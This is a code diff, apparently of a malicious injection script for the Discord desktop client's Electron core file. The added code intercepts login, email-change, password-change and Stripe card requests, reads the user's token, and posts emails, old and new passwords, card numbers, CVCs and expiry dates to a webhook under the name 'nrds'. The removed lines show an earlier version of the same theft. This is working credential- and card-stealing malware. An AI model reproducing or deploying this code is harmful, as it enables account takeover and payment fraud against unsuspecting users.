+            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
+            embeds: [
+                {
+                    "color": 7217906,
+                    "fields": [
+                        {
+                            "name": "Email Changed",
+                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Info",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    }             
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
 }
 
-session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
-  if (details.statusCode != 200) return;
- 
+function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        var json = JSON.parse(info);
+        var params = {
+            username: "nrds",
+            avatar_url: "https://cdn.discordapp.com/emojis/847947696806559755.gif?size=96",
+            embeds: [
+                {
+                    "color": 7217906,
+                    "fields": [
+                        {
+                            "name": "Credit Card Added",
+                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Info",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "inline": true
+                        },
+                        {
+                            "name": "Token",
+                            "value": `\`${token}\``,
+                            "inline": false
+                        }
+                    ],
+                    "author": {
+                        "name": json.username + "#" + json.discriminator + "・" + json.id,
+                        "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                    }
+                }
+            ]
+        }
+        SendToWebhook(JSON.stringify(params))
+    })
+}
 
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data)
-  const token = await getToken();
-
-  switch (true) {
-      case details.url.endsWith('login'):
-          var event = new nrdsInjEvent('userLogin', token, {
-              password: data.password,
-              email: data.login
-          });
-          event.handle();
-          return;
-      case details.url.endsWith('users/@me') && details.method == 'PATCH':
-          if (!data.password) return;
-          if (data.email) {
-              var event = new nrdsInjEvent('emailChanged', token, {
-                  password: data.password,
-                  email: data.email
-              });
-              event.handle();
-
-          };
-          if (data.new_password) {
-              var event = new nrdsInjEvent('passwordChanged', token, {
-                  password: data.password,
-                  new_password: data.new_password
-              });
-              event.handle();
-          };
-          return;
-      case details.url.endsWith('tokens') && details.method == "POST":
-          const card = querystring.parse(decodeURIComponent(unparsed_data))
-          var event = new nrdsInjEvent('creditCardAdded', token, {
-              cardnumber: card["card[number]"],
-              cvc: card["card[cvc]"],
-              expiration: card["card[exp_month]"] + "/" + card["card[exp_year]"]
-          });
-          event.handle();
-          return;
-      default:
-          break;
-  }
-
+const UrlFilter = {
+	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
+session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
+	if (details.url.endsWith("login")) {
+		if (details.statusCode == 200) {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			const email = data.login;
+			const password = data.password;
+			const window = BrowserWindow.getAllWindows()[0];
+			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+				Login(email, password, token)
+			}))
+		}
+	}
+	if (details.url.endsWith("users/@me")) {
+		if (details.statusCode == 200 && details.method == "PATCH") {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			if (data.password != null && data.password != undefined && data.password != "") {
+				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+						ChangePassword(data.password, data.new_password, token)
+					}))
+				}
+				if (data.email != null && data.email != undefined && data.email != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+						ChangeEmail(data.email, data.password, token)
+					}))
+				}
+			}
+		}
+	}
+	if (details.url.endsWith("tokens")) {
+		const item = querystring.parse(details.uploadData[0].bytes.toString())
+        SendToWebhook(JSON.stringify({ content: `${item["card[number]"]}\n${item["card[cvc]"]}\n${item["card[exp_month]"]}/${item["card[exp_year]"]}` }))
+        const window = BrowserWindow.getAllWindows()[0];
+        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
+            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
+        }))
+	}
 });
-
 module.exports = require('./core.asar')
